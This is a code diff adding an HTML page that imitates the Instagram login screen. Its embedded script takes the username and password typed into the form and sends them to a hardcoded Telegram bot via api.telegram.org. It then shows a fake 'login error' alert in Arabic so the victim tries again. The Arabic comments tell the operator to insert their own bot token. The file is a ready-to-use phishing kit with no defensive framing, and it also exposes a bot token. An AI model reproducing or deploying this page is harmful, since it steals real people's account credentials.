@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login . Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <style>
+        img {
+            vertical-align: text-top;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form" id="loginForm">
+                <div class="field">
+                    <input id="username" type="text" placeholder="Phone number, username, or email" required />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" required />
+                    <label for="password">Password</label>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // منع إعادة تحميل الصفحة
+
+            // جلب البيانات من الحقول
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            // إعداد البيانات للإرسال
+            let message = `🔔 *Instagram Login Attempt* 🔔\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+            // استبدل TOKEN و CHAT_ID بالقيم الخاصة بك
+            let telegramBotToken = "7897122987:AAEutcCTuehzpvUGUhGWT773tCLVm8brplU"; // ضع توكن البوت هنا
+            let chatId = "7172098832"; // ضع Chat ID هنا
+
+            let url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            let params = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            // إرسال الطلب إلى API تيليجرام
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("خطأ في تسجيل الدخول. الرجاء المحاولة مرة أخرى.");
+                } else {
+                    alert("حدث خطأ أثناء إرسال البيانات.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
